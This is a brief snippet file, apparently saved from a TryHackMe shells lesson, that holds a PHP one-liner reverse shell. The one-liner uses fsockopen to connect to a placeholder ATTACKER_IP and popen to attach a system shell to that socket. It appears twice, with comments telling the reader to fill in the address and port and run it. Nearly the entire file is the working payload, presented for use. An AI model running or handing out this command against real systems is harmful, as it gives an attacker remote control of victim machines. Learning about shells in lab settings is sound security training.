# PHP Reverse Shell - popen()
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, run with: php -r '<command>'
#
#   php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("sh <&3 >&3 2>&3", "r");'
#
# Uses popen() to open a process file pointer and execute the shell.

php -r '$sock=fsockopen("ATTACKER_IP",PORT);popen("sh <&3 >&3 2>&3", "r");'
